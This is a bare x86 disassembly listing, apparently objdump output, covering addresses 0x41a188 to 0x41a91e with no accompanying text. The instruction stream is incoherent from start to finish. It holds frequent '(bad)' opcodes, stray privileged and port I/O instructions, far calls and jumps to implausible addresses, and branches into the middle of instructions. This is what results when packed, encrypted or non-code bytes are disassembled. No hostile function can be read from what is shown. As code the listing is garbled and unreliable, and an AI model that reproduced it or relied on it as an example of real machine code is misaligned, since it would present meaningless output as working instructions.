  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
